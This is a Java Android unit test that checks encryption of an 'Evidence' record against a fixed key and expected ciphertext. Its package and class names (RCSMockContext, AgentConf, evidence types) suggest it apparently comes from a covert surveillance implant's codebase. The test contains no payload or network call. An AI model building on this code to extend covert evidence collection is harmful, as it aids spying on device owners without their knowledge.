package com.android.service.test;

import java.util.Arrays;

import android.test.AndroidTestCase;
import android.util.Log;

import com.android.service.Status;
import com.android.service.agent.AgentConf;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.mock.RCSMockContext;
import com.android.service.util.Check;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

import junit.framework.TestCase;

public class EvidenceTest extends AndroidTestCase {

	private String TAG = "EvidenceTest";

	protected void setUp() throws Exception {
		super.setUp();
		// RCSMockContext.setContext(getContext());
		Status.setAppContext(getContext());
	}

	protected void tearDown() throws Exception {
		super.tearDown();
	}

	public final void testEvidenceIntByteArray() {
		final byte[] key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
				0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

		Evidence evidence = new Evidence(EvidenceType.DEVICE, key);
		evidence.createEvidence(null);
		evidence.writeEvidence(WChar.getBytes("EMPTY"));

		byte[] expected = Utils
				.hexStringToByteArray("6f245cab61d26d01f514cbea5ae234c2");
		final byte[] encData = evidence.getEncData();

		Check.log( TAG + Utils.byteArrayToHex(encData));
		assertTrue(Arrays.equals(encData, expected));

	}

}
